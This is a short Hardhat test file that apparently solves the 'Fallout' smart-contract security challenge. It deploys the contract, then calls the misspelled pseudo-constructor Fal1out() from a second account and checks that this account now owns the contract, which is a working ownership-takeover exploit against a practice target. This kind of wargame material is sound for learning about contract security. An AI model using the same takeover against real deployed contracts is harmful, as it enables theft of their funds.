import { loadFixture, ethers, expect } from "./setup";

describe("Fallout", function() {

    async function deploy() {
        const signer = (await ethers.getSigners())[1];

        const factory = await ethers.getContractFactory("Fallout");
        const contract = await factory.deploy();

        await contract.waitForDeployment();

        return { contract, signer }
    }

    it("Solve the challenge", async function() {
        let tx;

        const { contract, signer } = await loadFixture(deploy);

        expect(contract.target).to.be.properAddress;
        
        tx = await contract.connect(signer).Fal1out();
        await tx.wait();
        
        const owner = await contract.owner();

        expect(owner).to.eq(signer.address);
    });

});